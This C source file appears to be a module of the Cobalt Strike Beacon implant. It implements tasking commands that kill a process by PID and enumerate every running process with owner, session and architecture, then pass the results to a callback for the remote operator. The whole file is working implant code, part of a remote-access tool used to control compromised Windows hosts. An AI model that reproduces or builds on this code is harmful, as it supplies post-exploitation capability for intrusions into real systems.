/*
 * List and Kill Processes
 */
#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#include "tokens.h"
#include "commands.h"
#include "parse.h"
#include "beacon.h"
#include "bformat.h"

void command_ps_kill(char * buffer, int length) {
	HANDLE h = NULL;
	DWORD pid;
	datap parser = {0};

	/* extract our PID */
	data_init(&parser, buffer, length);
	pid = data_int(&parser);

	h = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
	if (h && TerminateProcess(h, 0)) {
		/* do nothing, we're good */
	}
	else {
		post_error_dd(0x23, pid, GetLastError());
	}

	CloseHandle(h);
}

/* Get the username for a process */
BOOL ps_getusername( HANDLE hProcess, char * buffer, DWORD length ) {
	HANDLE hToken;
	BOOL result;

	if( !OpenProcessToken(hProcess, TOKEN_QUERY, &hToken ))
		return FALSE;
	result = token_user(hToken, buffer, length);
	CloseHandle( hToken );

	return result;
}

/* check if a process is x64 or not */
BOOL is_x64_process(HANDLE process) {
	if (is_x64() || is_wow64(GetCurrentProcess())) {
		return !is_wow64(process);
	}

	return FALSE;
}

void command_ps_list(char * buffer, int length, void (*callback)(char * buffer, int length, int type)) {
	HANDLE hProcessSnap;
	HANDLE hProcess;
	PROCESSENTRY32 pe32;
	char user[2048] = {0};
	formatp         format;
	DWORD sessid;
	char * x64 = "x64";
	char * x86 = "x86";
	char * arch;
	char * native;

	datap  parser;
	int    reqid;

	/* init our data parser */
	data_init(&parser, buffer, length);

	/* extract our callback ID */
	reqid = data_int(&parser);

	/* init our output buffer */
	bformat_init(&format, 32768);

	/* copy the callback ID to our output */
	if (reqid > 0)
		bformat_int(&format, reqid);

	/* check what kind of process we are...  since Beacon is 32-bit only */
	if (is_wow64(GetCurrentProcess()))
		native = x64;
	else
		native = is_x64() ? x64 : x86;

	// Take a snapshot of all processes in the system.
	hProcessSnap = CreateToolhelp32Snapshot( TH32CS_SNAPPROCESS, 0 );
	if ( hProcessSnap == INVALID_HANDLE_VALUE ) {
		bformat_free(&format);
		return;
	}

	// Set the size of the structure before using it.
	pe32.dwSize = sizeof( PROCESSENTRY32 );

	// Retrieve information about the first process,
	// and exit if unsuccessful
	if( !Process32First( hProcessSnap, &pe32 ) ) {
		CloseHandle( hProcessSnap );          // clean the snapshot object
		bformat_free(&format);
		return;
	}

	// Now walk the snapshot of processes, and
	// display information about each process in turn
	do {
		hProcess = OpenProcess(is_vista_or_later() ? PROCESS_QUERY_LIMITED_INFORMATION : PROCESS_QUERY_INFORMATION, FALSE, pe32.th32ProcessID );

		if( !hProcess ) {
			bformat_printf(&format, "%s\t%d\t%d\n", pe32.szExeFile, pe32.th32ParentProcessID, pe32.th32ProcessID);
		}
		else {
			if (!ps_getusername(hProcess, user, 2048))
				user[0] = '\0';

			if (!ProcessIdToSessionId(pe32.th32ProcessID, &sessid))
				sessid = -1;

			if (is_wow64(hProcess)) {
				arch = x86;
			}
			else {
				arch = native;
			}

			bformat_printf(&format, "%s\t%d\t%d\t%s\t%s\t%d\n", pe32.szExeFile, pe32.th32ParentProcessID, pe32.th32ProcessID, arch, user, sessid);
		}

		CloseHandle(hProcess);
	}
	while( Process32Next( hProcessSnap, &pe32 ) );

	CloseHandle( hProcessSnap );

	if (reqid == 0) {
		callback(bformat_string(&format), bformat_length(&format), CALLBACK_PROCESS_LIST);
	}
	else {
		callback(bformat_string(&format), bformat_length(&format), CALLBACK_PENDING);
	}

	bformat_free(&format);
	return;
}
